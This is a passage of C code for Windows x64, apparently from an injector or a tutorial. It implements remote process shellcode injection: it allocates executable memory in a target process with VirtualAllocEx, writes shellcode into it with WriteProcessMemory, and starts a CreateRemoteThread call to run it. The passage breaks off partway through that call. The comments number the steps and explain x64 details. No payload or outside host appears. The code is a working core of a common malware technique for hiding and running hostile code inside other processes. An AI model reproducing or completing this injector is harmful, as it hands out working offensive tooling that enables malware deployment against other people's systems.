        hProcess, 
        NULL, 
        codeSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );

    if (!remoteBuffer) {
        CloseHandle(hProcess);
        return FALSE;
    }

    // 3. Write Shellcode into remote process
    // Size_t is 64-bit here, preventing truncation issues common in legacy x86 code
    if (!WriteProcessMemory(
        hProcess, 
        remoteBuffer, 
        code, 
        codeSize, 
        &bytesWritten
    )) {
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 4. Execution via CreateRemoteThread
    // In x64, the thread start routine must follow the x64 calling convention
    hThread = CreateRemoteThread(
        hProcess, 
        NULL, 
        0, 
